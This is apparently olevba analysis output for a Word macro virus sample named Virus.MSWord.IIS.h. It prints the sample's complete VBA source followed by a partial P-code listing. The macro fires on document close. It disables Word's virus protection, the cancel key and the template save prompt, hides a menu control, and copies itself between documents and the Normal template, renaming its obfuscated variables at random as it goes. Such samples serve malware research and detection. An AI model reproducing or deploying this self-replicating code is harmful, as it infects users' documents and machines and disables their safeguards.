olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.IIS.h
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.IIS.h - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
Application.CommandBars("Tools").Controls(12).Controls(3).Visible = False
�ÊœœÂË‡‰ˆŽ˜£• = NormalTemplate.VBProject.vbcomponents(1).codemodule.lines(1, 1)
If �ÊœœÂË‡‰ˆŽ˜£• = "Private Sub Document_Close()" Then
Set ¿¦ÅÆº = ActiveDocument
Set ¾Á�¼œ…¥¯‰¥§Á³ = NormalTemplate
••Æ� = 1
End If
�ÊœœÂË‡‰ˆŽ˜£• = ActiveDocument.VBProject.vbcomponents(1).codemodule.lines(1, 1)
If �ÊœœÂË‡‰ˆŽ˜£• = "Private Sub Document_Close()" Then
Set ¿¦ÅÆº = NormalTemplate
Set ¾Á�¼œ…¥¯‰¥§Á³ = ActiveDocument
••Æ� = ••Æ� + 2
End If
If ••Æ� = 3 Then Exit Sub
'�ÊœœÂË‡‰ˆŽ˜£•
'••Æ�
'¿¦ÅÆº
'¾Á�¼œ…¥¯‰¥§Á³
Application.Options.VirusProtection = False
'ŸÁÇµŒ¯Å›¹œ‘‹²ˆÅ«Äƒ
'´¨¢®º„¿» ½¯ À¸�
'¶ÄÄžÇÇÃ� ¢Â‘
'¬«Œ�›Ç’©·»ÊºÆ»
Application.EnableCancelKey = wdCancelDisabled
'‘˜»�Ã¶�’²„½‚–
'Ç¾¦�¼�ˆÀ¼¨Œ§­„‡
'ºŠ˜µ­¿»²¾‰�Â™›²•¶½´
'¦�¨ÉŽ�µ
' ¿Æ‘¬ƒ©‰…¥¿§’…„™¶Ë“
'„œš›¤º–”»„�·Ž¬®§¼…Ÿ¶¬
'§¾“‰¬·¨¬¢ŸÀ»­…Èª’¨­
'�Š«¼½•›Æ�’´¯™š
Options.SaveNormalPrompt = False
'¡ËŒ‹ˆÃ��¿ ¬–·‘ÉÉ¡‹¢
'¿…¡�¢¦§Å®—°
'–´Ÿ †¤Å«Á°†£›Ä�¤¤œµ
'´¸´¤¡‡“™¯§Š¢
'ÅÂ¨�ÆšÀš‘–Ä¹
'…º½®‘”µˆ¥ª¼�§ËŠ¦
'»˜¨ˆ´–¼È™Å§–•©¤Œ¯
'Ëƒ
ReDim ¶ÄÄžÇÇÃ� ¢Â‘(25, 25)
Do Until ºŠ˜µ­¿»²¾‰�Â™›²•¶½´ = ¾Á�¼œ…¥¯‰¥§Á³.VBProject.vbcomponents(1).codemodule.countoflines
ºŠ˜µ­¿»²¾‰�Â™›²•¶½´ = ºŠ˜µ­¿»²¾‰�Â™›²•¶½´ + 1
ŸÁÇµŒ¯Å›¹œ‘‹²ˆÅ«Äƒ = ¾Á�¼œ…¥¯‰¥§Á³.VBProject.vbcomponents(1).codemodule.lines(ºŠ˜µ­¿»²¾‰�Â™›²•¶½´, 1)
If Left(ŸÁÇµŒ¯Å›¹œ‘‹²ˆÅ«Äƒ, 1) = "'" Then
´¨¢®º„¿» ½¯ À¸� = ´¨¢®º„¿» ½¯ À¸� + 1
¶ÄÄžÇÇÃ� ¢Â‘(´¨¢®º„¿» ½¯ À¸�, 1) = Mid(ŸÁÇµŒ¯Å›¹œ‘‹²ˆÅ«Äƒ, 2, Len(ŸÁÇµŒ¯Å›¹œ‘‹²ˆÅ«Äƒ))
Randomize Timer
¬«Œ�›Ç’©·»ÊºÆ» = Int(Rnd * 20) + 2
For ‘˜»�Ã¶�’²„½‚– = 1 To ¬«Œ�›Ç’©·»ÊºÆ»
d = Int(Rnd * 74) + 130
Ç¾¦�¼�ˆÀ¼¨Œ§­„‡ = Ç¾¦�¼�ˆÀ¼¨Œ§­„‡ & Chr(d)
Next ‘˜»�Ã¶�’²„½‚–
¶ÄÄžÇÇÃ� ¢Â‘(´¨¢®º„¿» ½¯ À¸�, 2) = Ç¾¦�¼�ˆÀ¼¨Œ§­„‡
End If
Ç¾¦�¼�ˆÀ¼¨Œ§­„‡ = ""
Loop
For ¦�¨ÉŽ�µ = 1 To 24
 ¿Æ‘¬ƒ©‰…¥¿§’…„™¶Ë“ = ¶ÄÄžÇÇÃ� ¢Â‘(¦�¨ÉŽ�µ, 2)
For „œš›¤º–”»„�·Ž¬®§¼…Ÿ¶¬ = ¦�¨ÉŽ�µ + 1 To 24
If ¶ÄÄžÇÇÃ� ¢Â‘(„œš›¤º–”»„�·Ž¬®§¼…Ÿ¶¬, 2) =  ¿Æ‘¬ƒ©‰…¥¿§’…„™¶Ë“ Then
�Š«¼½•›Æ�’´¯™š = Int(Rnd * 71) + 130
¶ÄÄžÇÇÃ� ¢Â‘(„œš›¤º–”»„�·Ž¬®§¼…Ÿ¶¬, 2) = Chr(�Š«¼½•›Æ�’´¯™š)
End If
Next „œš›¤º–”»„�·Ž¬®§¼…Ÿ¶¬
For §¾“‰¬·¨¬¢ŸÀ»­…Èª’¨­ = 1 To 24
If ¶ÄÄžÇÇÃ� ¢Â‘(§¾“‰¬·¨¬¢ŸÀ»­…Èª’¨­, 1) =  ¿Æ‘¬ƒ©‰…¥¿§’…„™¶Ë“ Then
�Š«¼½•›Æ�’´¯™š = Int(Rnd * 71) + 130
¶ÄÄžÇÇÃ� ¢Â‘(¦�¨ÉŽ�µ, 2) = Chr(�Š«¼½•›Æ�’´¯™š)
 ¿Æ‘¬ƒ©‰…¥¿§’…„™¶Ë“ = ¶ÄÄžÇÇÃ� ¢Â‘(¦�¨ÉŽ�µ, 2)
End If
Next §¾“‰¬·¨¬¢ŸÀ»­…Èª’¨­
Next ¦�¨ÉŽ�µ
´¨¢®º„¿» ½¯ À¸� = 1
Do Until ´¨¢®º„¿» ½¯ À¸� = ¾Á�¼œ…¥¯‰¥§Á³.VBProject.vbcomponents(1).codemodule.countoflines
 ¿Æ‘¬ƒ©‰…¥¿§’…„™¶Ë“ = ¾Á�¼œ…¥¯‰¥§Á³.VBProject.vbcomponents(1).codemodule.lines(´¨¢®º„¿» ½¯ À¸�, 1)
´¨¢®º„¿» ½¯ À¸� = ´¨¢®º„¿» ½¯ À¸� + 1
¡ËŒ‹ˆÃ��¿ ¬–·‘ÉÉ¡‹¢ = Len( ¿Æ‘¬ƒ©‰…¥¿§’…„™¶Ë“)
¿…¡�¢¦§Å®—° = 0
Do Until ¿…¡�¢¦§Å®—° >= ¡ËŒ‹ˆÃ��¿ ¬–·‘ÉÉ¡‹¢
¿…¡�¢¦§Å®—° = ¿…¡�¢¦§Å®—° + 1
¬«Œ�›Ç’©·»ÊºÆ» = Mid( ¿Æ‘¬ƒ©‰…¥¿§’…„™¶Ë“, ¿…¡�¢¦§Å®—°, 1)
If Asc(¬«Œ�›Ç’©·»ÊºÆ») > 64 Then
var = var & Mid( ¿Æ‘¬ƒ©‰…¥¿§’…„™¶Ë“, ¿…¡�¢¦§Å®—°, 1)
Else
»˜¨ˆ´–¼È™Å§–•©¤Œ¯:
If Len(var) > 0 Then
For –´Ÿ †¤Å«Á°†£›Ä�¤¤œµ = 1 To 24
If ¶ÄÄžÇÇÃ� ¢Â‘(–´Ÿ †¤Å«Á°†£›Ä�¤¤œµ, 1) = var Then
var = ¶ÄÄžÇÇÃ� ¢Â‘(–´Ÿ †¤Å«Á°†£›Ä�¤¤œµ, 2)
¡ËŒ‹ˆÃ��¿ ¬–·‘ÉÉ¡‹¢ = Len(¶ÄÄžÇÇÃ� ¢Â‘(–´Ÿ †¤Å«Á°†£›Ä�¤¤œµ, 1))
If §¾“‰¬·¨¬¢ŸÀ»­…Èª’¨­ = 1 Then ¡ËŒ‹ˆÃ��¿ ¬–·‘ÉÉ¡‹¢ = ¡ËŒ‹ˆÃ��¿ ¬–·‘ÉÉ¡‹¢ - 1
´¸´¤¡‡“™¯§Š¢ = Mid( ¿Æ‘¬ƒ©‰…¥¿§’…„™¶Ë“, 1, ¿…¡�¢¦§Å®—° - ¡ËŒ‹ˆÃ��¿ ¬–·‘ÉÉ¡‹¢ - 1)
¡ËŒ‹ˆÃ��¿ ¬–·‘ÉÉ¡‹¢ = Len( ¿Æ‘¬ƒ©‰…¥¿§’…„™¶Ë“)
If §¾“‰¬·¨¬¢ŸÀ»­…Èª’¨­ = 1 Then
ÅÂ¨�ÆšÀš‘–Ä¹ = ""
Else
ÅÂ¨�ÆšÀš‘–Ä¹ = Mid( ¿Æ‘¬ƒ©‰…¥¿§’…„™¶Ë“, ¿…¡�¢¦§Å®—°, ¡ËŒ‹ˆÃ��¿ ¬–·‘ÉÉ¡‹¢)
End If
 ¿Æ‘¬ƒ©‰…¥¿§’…„™¶Ë“ = ´¸´¤¡‡“™¯§Š¢ & var & ÅÂ¨�ÆšÀš‘–Ä¹
¡ËŒ‹ˆÃ��¿ ¬–·‘ÉÉ¡‹¢ = Len( ¿Æ‘¬ƒ©‰…¥¿§’…„™¶Ë“)
¿…¡�¢¦§Å®—° = ¿…¡�¢¦§Å®—° + Len(var) - Len(¶ÄÄžÇÇÃ� ¢Â‘(–´Ÿ †¤Å«Á°†£›Ä�¤¤œµ, 1))
Exit For
End If
Next –´Ÿ †¤Å«Á°†£›Ä�¤¤œµ
End If
var = ""
If §¾“‰¬·¨¬¢ŸÀ»­…Èª’¨­ = 1 Then
§¾“‰¬·¨¬¢ŸÀ»­…Èª’¨­ = 0
GoTo …º½®‘”µˆ¥ª¼�§ËŠ¦
End If
End If
Loop
§¾“‰¬·¨¬¢ŸÀ»­…Èª’¨­ = 1
GoTo »˜¨ˆ´–¼È™Å§–•©¤Œ¯
…º½®‘”µˆ¥ª¼�§ËŠ¦:
Ëƒ = Ëƒ &  ¿Æ‘¬ƒ©‰…¥¿§’…„™¶Ë“ & Chr(13)
 ¿Æ‘¬ƒ©‰…¥¿§’…„™¶Ë“ = ""
Loop
Ëƒ = Ëƒ & " End Sub"
¿¦ÅÆº.VBProject.vbcomponents(1).codemodule.deletelines 1, ¿¦ÅÆº.VBProject.vbcomponents(1).codemodule.countoflines
¿¦ÅÆº.VBProject.vbcomponents(1).codemodule.addfromstring (Ëƒ)
 End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.IIS.h
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 6868 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' 	LitVarSpecial (False)
' 	LitDI2 0x0003 
' 	LitDI2 0x000C 
' 	LitStr 0x0005 "Tools"
' 	Ld Application 
' 	ArgsMemLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Visible 
' Line #2:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd vbcomponents 0x0001 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	St �ÊœœÂË‡‰ˆŽ˜£• 
' Line #3:
' 	Ld �ÊœœÂË‡‰ˆŽ˜£• 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Eq 
' 	IfBlock 
' Line #4:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set ¿¦ÅÆº 
' Line #5:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set ¾Á�¼œ…¥¯‰¥§Á³ 
' Line #6:
' 	LitDI2 0x0001 
' 	St ••Æ� 
' Line #7:
' 	EndIfBlock 
' Line #8:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd vbcomponents 0x0001 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	St �ÊœœÂË‡‰ˆŽ˜£• 
' Line #9:
' 	Ld �ÊœœÂË‡‰ˆŽ˜£• 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Eq 
' 	IfBlock 
' Line #10:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set ¿¦ÅÆº 
' Line #11:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set ¾Á�¼œ…¥¯‰¥§Á³ 
' Line #12:
' 	Ld ••Æ� 
' 	LitDI2 0x0002 
' 	Add 
' 	St ••Æ� 
' Line #13:
' 	EndIfBlock 
' Line #14:
' 	Ld ••Æ� 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #15:
' 	QuoteRem 0x0000 0x000D "�ÊœœÂË‡‰ˆŽ˜£•"
' Line #16:
' 	QuoteRem 0x0000 0x0004 "••Æ�"
' Line #17:
' 	QuoteRem 0x0000 0x0005 "¿¦ÅÆº"
' Line #18:
' 	QuoteRem 0x0000 0x000D "¾Á�¼œ…¥¯‰¥§Á³"
' Line #19:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemLd Options 
' 	MemSt VirusProtection 
' Line #20:
' 	QuoteRem 0x0000 0x0012 "ŸÁÇµŒ¯Å›¹œ‘‹²ˆÅ«Äƒ"
' Line #21:
' 	QuoteRem 0x0000 0x000F "´¨¢®º„¿» ½¯ À¸�"
' Line #22:
' 	QuoteRem 0x0000 0x000C "¶ÄÄžÇÇÃ� ¢Â‘"
' Line #23:
' 	QuoteRem 0x0000 0x000E "¬«Œ�›Ç’©·»ÊºÆ»"
' Line #24:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #25:
' 	QuoteRem 0x0000 0x000D "‘˜»�Ã¶�’²„½‚–"
' Line #26:
' 	QuoteRem 0x0000 0x000F "Ç¾¦�¼�ˆÀ¼¨Œ§­„‡"
' Line #27:
' 	QuoteRem 0x0000 0x0013 "ºŠ˜µ­¿»²¾‰�Â™›²•¶½´"
' Line #28:
' 	QuoteRem 0x0000 0x0007 "¦�¨ÉŽ�µ"
' Line #29:
' 	QuoteRem 0x0000 0x0013 " ¿Æ‘¬ƒ©‰…¥¿§’…„™¶Ë“"
' Line #30:
' 	QuoteRem 0x0000 0x0015 "„œš›¤º–”»„�·Ž¬®§¼…Ÿ¶¬"
' Line #31:
' 	QuoteRem 0x0000 0x0013 "§¾“‰¬·¨¬¢ŸÀ»­…Èª’¨­"
' Line #32:
' 	QuoteRem 0x0000 0x000E "�Š«¼½•›Æ�’´¯™š"
' Line #33:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #34:
' 	QuoteRem 0x0000 0x0013 "¡ËŒ‹ˆÃ��¿ ¬–·‘ÉÉ¡‹¢"
' Line #35:
' 	QuoteRem 0x0000 0x000B "¿…¡�¢¦§Å®—°"
' Line #36:
' 	QuoteRem 0x0000 0x0013 "–´Ÿ †¤Å«Á°†£›Ä�¤¤œµ"
' Line #37:
' 	QuoteRem 0x0000 0x000C "´¸´¤¡‡“™¯§Š¢"
' Line #38:
' 	QuoteRem 0x0000 0x000C "ÅÂ¨�ÆšÀš‘–Ä¹"
' Line #39:
' 	QuoteRem 0x0000 0x0010 "…º½®‘”µˆ¥ª¼�§ËŠ¦"
' Line #40:
' 	QuoteRem 0x0000 0x0011 "»˜¨ˆ´–¼È™Å§–•©¤Œ¯"
' Line #41:
' 	QuoteRem 0x0000 0x0002 "Ëƒ"
' Line #42:
' 	OptionBase 
' 	LitDI2 0x0019 
' 	OptionBase 
' 	LitDI2 0x0019 
' 	Redim ¶ÄÄžÇÇÃ� ¢Â‘ 0x0002 (As Variant)
' Line #43:
' 	Ld ºŠ˜µ­¿»²¾‰�Â™›²•¶½´ 
' 	LitDI2 0x0001 
' 	Ld ¾Á�¼œ…¥¯‰¥§Á³ 
' 	MemLd VBProject 
' 	ArgsMemLd vbcomponents 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	Eq 
' 	DoUnitil 
' Line #44:
' 	Ld ºŠ˜µ­¿»²¾‰�Â™›²•¶½´ 
' 	LitDI2 0x0001 
' 	Add 
' 	St ºŠ˜µ­¿»²¾‰�Â™›²•¶½´ 
' Line #45:
' 	Ld ºŠ˜µ­¿»²¾‰�Â™›²•¶½´ 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ¾Á�¼œ…¥¯‰¥§Á³ 
' 	MemLd VBProject 
' 	ArgsMemLd vbcomponents 0x0001 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	St ŸÁÇµŒ¯Å›¹œ‘‹²ˆÅ«Äƒ 
' Line #46:
' 	Ld ŸÁÇµŒ¯Å›¹œ‘‹²ˆÅ«Äƒ 
' 	LitDI2 0x0001 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0001 "'"
' 	Eq 
' 	IfBlock 
' Line #47:
' 	Ld ´¨¢®º„¿» ½¯ À¸� 
' 	LitDI2 0x0001 
' 	Add 
' 	St ´¨¢®º„¿» ½¯ À¸� 
' Line #48:
' 	Ld ŸÁÇµŒ¯Å›¹œ‘‹²ˆÅ«Äƒ 
' 	LitDI2 0x0002 
' 	Ld ŸÁÇµŒ¯Å›¹œ‘‹²ˆÅ«Äƒ 
' 	FnLen 
' 	ArgsLd Mid$ 0x0003 
' 	Ld ´¨¢®º„¿» ½¯ À¸� 
' 	LitDI2 0x0001 
' 	ArgsSt ¶ÄÄžÇÇÃ� ¢Â‘ 0x0002 
' Line #49:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #50:
' 	Ld Rnd 
' 	LitDI2 0x0014 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0002 
' 	Add 
' 	St ¬«Œ�›Ç’©·»ÊºÆ» 
' Line #51:
' 	StartForVariable 
' 	Ld ‘˜»�Ã¶�’²„½‚– 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ¬«Œ�›Ç’©·»ÊºÆ» 
' 	For 
' Line #52:
' 	Ld Rnd 
' 	LitDI2 0x004A 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0082 
' 	Add 
' 	St d 
' Line #53:
' 	Ld Ç¾¦�¼�ˆÀ¼¨Œ§­„‡ 
' 	Ld d 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St Ç¾¦�¼�ˆÀ¼¨Œ§­„‡ 
' Line #54:
' 	StartForVariable 
' 	Ld ‘˜»�Ã¶�’²„½‚– 
' 	EndForVariable 
' 	NextVar 
' Line #55:
' 	Ld Ç¾¦�¼�ˆÀ¼¨Œ§­„‡ 
' 	Ld ´¨¢®º„¿» ½¯ À¸� 
' 	LitDI2 0x0002 
' 	ArgsSt ¶ÄÄžÇÇÃ� ¢Â‘ 0x0002 
' Line #56:
' 	EndIfBlock 
' Line #57:
' 	LitStr 0x0000 ""
' 	St Ç¾¦�¼�ˆÀ¼¨Œ§­„‡ 
' Line #58:
' 	Loop 
' Line #59:
' 	StartForVariable 
' 	Ld ¦�¨ÉŽ�µ 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0018 
' 	For 
' Line #60:
' 	Ld ¦�¨ÉŽ�µ 
' 	LitDI2 0x0002 
' 	ArgsLd ¶ÄÄžÇÇÃ� ¢Â‘ 0x0002 
' 	St  ¿Æ‘¬ƒ©‰…¥¿§’…„™¶Ë“ 
' Line #61:
' 	StartForVariable 
' 	Ld „œš›¤º–”»„�·Ž¬®§¼…Ÿ¶¬ 
' 	EndForVariable 
' 	Ld ¦�¨ÉŽ�µ 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0018 
' 	For 
' Line #62:
' 	Ld „œš›¤º–”»„�·Ž¬®§¼…Ÿ¶¬ 
' 	LitDI2 0x0002 
' 	ArgsLd ¶ÄÄžÇÇÃ� ¢Â‘ 0x0002 
' 	Ld  ¿Æ‘¬ƒ©‰…¥¿§’…„™¶Ë“ 
' 	Eq 
' 	IfBlock 
' Line #63:
' 	Ld Rnd 
' 	LitDI2 0x0047 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0082 
' 	Add 
' 	St �Š«¼½•›Æ�’´¯™š 
' Line #64:
' 	Ld �Š«¼½•›Æ�’´¯™š 
' 	ArgsLd Chr 0x0001 
' 	Ld „œš›¤º–”»„�·Ž¬®§¼…Ÿ¶¬ 
' 	LitDI2 0x0002 
' 	ArgsSt ¶ÄÄžÇÇÃ� ¢Â‘ 0x0002 
' Line #65:
' 	EndIfBlock 
' Line #66:
' 	StartForVariable 
' 	Ld „œš›¤º–”»„�·Ž¬®§¼…Ÿ¶¬ 
' 	EndForVariable 
' 	NextVar 
' Line #67:
' 	StartForVariable 
' 	Ld §¾“‰¬·¨¬¢ŸÀ»­…Èª’¨­ 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0018 
' 	For 
' Line #68:
' 	Ld §¾“‰¬·¨¬¢ŸÀ»­…Èª’¨­ 
' 	LitDI2 0x0001 
' 	ArgsLd ¶ÄÄžÇÇÃ� ¢Â‘ 0x0002 
' 	Ld  ¿Æ‘¬ƒ©‰…¥¿§’…„™¶Ë“ 
' 	Eq 
' 	IfBlock 
' Line #69:
' 	Ld Rnd 
' 	LitDI2 0x0047 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0082 
' 	Add 
' 	St �Š«¼½•›Æ�’´¯™š 
' Line #70:
' 	Ld �Š«¼½•›Æ�’´¯™š 
' 	ArgsLd Chr 0x0001 
' 	Ld ¦�¨ÉŽ�µ 
' 	LitDI2 0x0002 
' 	ArgsSt ¶ÄÄžÇÇÃ� ¢Â‘ 0x0002 
' Line #71:
' 	Ld ¦�¨ÉŽ�µ 
' 	LitDI2 0x0002 
' 	ArgsLd ¶ÄÄžÇÇÃ� ¢Â‘ 0x0002 
' 	St  ¿Æ‘¬ƒ©‰…¥¿§’…„™¶Ë“ 
' Line #72:
' 	EndIfBlock 
' Line #73:
' 	StartForVariable 
' 	Ld §¾“‰¬·¨¬¢ŸÀ»­…Èª’¨­ 
' 	EndForVariable 
' 	NextVar 
' Line #74:
' 	StartForVariable 
' 	Ld ¦�¨ÉŽ�µ 
' 	EndForVariable 
' 	NextVar 
' Line #75:
' 	LitDI2 0x0001 
' 	St ´¨¢®º„¿» ½¯ À¸� 
' Line #76:
' 	Ld ´¨¢®º„¿» ½¯ À¸� 
' 	LitDI2 0x0001 
' 	Ld ¾Á�¼œ…¥¯‰¥§Á³ 
' 	MemLd VBProject 
' 	ArgsMemLd vbcomponents 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	Eq 
' 	DoUnitil 
' Line #77:
' 	Ld ´¨¢®º„¿» ½¯ À¸� 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ¾Á�¼œ…¥¯‰¥§Á³ 
' 	MemLd VBProject 
' 	ArgsMemLd vbcomponents 0x0001 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	St  ¿Æ‘¬ƒ©‰…¥¿§’…„™¶Ë“ 
' Line #78:
' 	Ld ´¨¢®º„¿» ½¯ À¸� 
' 	LitDI2 0x0001 
' 	Add 
' 	St ´¨¢®º„¿» ½¯ À¸� 
' Line #79:
' 	Ld  ¿Æ‘¬ƒ©‰…¥¿§’…„™¶Ë“ 
' 	FnLen 
' 	St ¡ËŒ‹ˆÃ��¿ ¬–·‘ÉÉ¡‹¢ 
' Line #80:
' 	LitDI2 0x0000 
' 	St ¿…¡�¢¦§Å®—° 
' Line #81:
' 	Ld ¿…¡�¢¦§Å®—° 
' 	Ld ¡ËŒ‹ˆÃ��¿ ¬–·‘ÉÉ¡‹¢ 
' 	Ge 
' 	DoUnitil 
' Line #82:
' 	Ld ¿…¡�¢¦§Å®—° 
' 	LitDI2 0x0001 
' 	Add 
' 	St ¿…¡�¢¦§Å®—° 
' Line #83:
' 	Ld  ¿Æ‘¬ƒ©‰…¥¿§’…„™¶Ë“ 
' 	Ld ¿…¡�¢¦§Å®—° 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St ¬«Œ�›Ç’©·»ÊºÆ» 
' Line #84:
' 	Ld ¬«Œ�›Ç’©·»ÊºÆ» 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x0040 
' 	Gt 
' 	IfBlock 
' Line #85:
' 	Ld var 
' 	Ld  ¿Æ‘¬ƒ©‰…¥¿§’…„™¶Ë“ 
' 	Ld ¿…¡�¢¦§Å®—° 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St var 
' Line #86:
' 	ElseBlock 
' Line #87:
' 	Label »˜¨ˆ´–¼È™Å§–•©¤Œ¯ 
' Line #88:
' 	Ld var 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #89:
' 	StartForVariable 
' 	Ld –´Ÿ †¤Å«Á°†£›Ä�¤¤œµ 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0018 
' 	For 
' Line #90:
' 	Ld –´Ÿ †¤Å«Á°†£›Ä�¤¤œµ 
' 	LitDI2 0x0001 
' 	ArgsLd ¶ÄÄžÇÇÃ� ¢Â‘ 0x0002 
' 	Ld var 
' 	Eq 
' 	IfBlock 
' Line #91:
' 	Ld –´Ÿ †¤Å«Á°†£›Ä�¤¤œµ 
' 	LitDI2 0x0002 
' 	ArgsLd ¶ÄÄžÇÇÃ� ¢Â‘ 0x0002 
' 	St var 
' Line #92:
' 	Ld –´Ÿ †¤Å«Á°†£›Ä�¤¤œµ 
' 	LitDI2 0x0001 
' 	ArgsLd ¶ÄÄžÇÇÃ� ¢Â‘ 0x0002 
' 	FnLen 
' 	St ¡ËŒ‹ˆÃ��¿ ¬–·‘ÉÉ¡‹¢ 
' Line #93:
' 	Ld §¾“‰¬·¨¬¢ŸÀ»­…Èª’¨­ 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ¡ËŒ‹ˆÃ��¿ ¬–·‘ÉÉ¡‹¢ 
' 	LitDI2 0x0001 
' 	Sub 
' 	St ¡ËŒ‹ˆÃ��¿ ¬–·‘ÉÉ¡‹¢ 
' 	EndIf 
' Line #94:
' 	Ld  ¿Æ‘¬ƒ©‰…¥¿§’…„™¶Ë“ 
' 	LitDI2 0x0001 
' 	Ld ¿…¡�¢¦§Å®—° 
' 	Ld ¡ËŒ‹ˆÃ��¿ ¬–·‘ÉÉ¡‹¢ 
' 	Sub 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	St ´¸´¤¡‡“™¯§Š¢ 
' Line #95:
' 	Ld  ¿Æ‘¬ƒ©‰…¥¿§’…„™¶Ë“ 
' 	FnLen 
' 	St ¡ËŒ‹ˆÃ��¿ ¬–·‘ÉÉ¡‹¢ 
' Line #96:
' 	Ld §¾“‰¬·¨¬¢ŸÀ»­…Èª’¨­ 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #97:
' 	LitStr 0x0000 ""
' 	St ÅÂ¨�ÆšÀš‘–Ä¹ 
' Line #98:
' 	ElseBlock 
' Line #99:
' 	Ld  ¿Æ‘¬ƒ©‰…¥¿§’…„™¶Ë“ 
' 	Ld ¿…¡�¢¦§Å®—° 
' 	Ld ¡ËŒ‹ˆÃ��¿ ¬–·‘ÉÉ¡‹¢ 
' 	ArgsLd Mid$ 0x0003 
' 	St ÅÂ¨�ÆšÀš‘–Ä¹ 
' Line #100:
' 	EndIfBlock 
' Line #101:
' 	Ld ´¸´¤¡‡“™¯§Š¢ 
' 	Ld var 
' 	Concat 
' 	Ld ÅÂ¨�ÆšÀš‘–Ä¹ 
' 	Concat 
' 	St  ¿Æ‘¬ƒ©‰…¥¿§’…„™¶Ë“ 
' Line #102:
' 	Ld  ¿Æ‘¬ƒ©‰…¥¿§’…„™¶Ë“ 
' 	FnLen 
' 	St ¡ËŒ‹ˆÃ��¿ ¬–·‘ÉÉ¡‹¢ 
' Line #103:
' 	Ld ¿…¡�¢¦§Å®—° 
' 	Ld var 
' 	FnLen 
' 	Add 
' 	Ld –´Ÿ †¤Å«Á°†£›Ä�¤¤œµ 
' 	LitDI2 0x0001 
' 	ArgsLd ¶ÄÄžÇÇÃ� ¢Â‘ 0x0002 
' 	FnLen 
' 	Sub 
' 	St ¿…¡�¢¦§Å®—° 
' Line #104:
' 	ExitFor 
' Line #105:
' 	EndIfBlock 
' Line #106:
' 	StartForVariable 
' 	Ld –´Ÿ †¤Å«Á°†£›Ä�¤¤œµ 
' 	EndForVariable 
' 	NextVar 
' Line #107:
' 	EndIfBlock 
' Line #108:
' 	LitStr 0x0000 ""
' 	St var 
' Line #109:
' 	Ld §¾“‰¬·¨¬¢ŸÀ»­…Èª’¨­ 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #110:
' 	LitDI2 0x0000 
' 	St §¾“‰¬·¨¬¢ŸÀ»­…Èª’¨­ 
' Line #111:
' 	GoTo …º½®‘”µˆ¥ª¼�§ËŠ¦ 
' Line #112:
' 	EndIfBlock 
' Line #113:
' 	EndIfBlock 
' Line #114:
' 	Loop 
' Line #115:
' 	LitDI2 0x0001 
' 	St §¾“‰¬·¨¬¢ŸÀ»­…Èª’¨­ 
' Line #116:
' 	GoTo »˜¨ˆ´–¼È™Å§–•©¤Œ¯ 
' Line #117:
' 	Label …º½®‘”µˆ¥ª¼�§ËŠ¦ 
' Line #118:
' 	Ld Ëƒ 
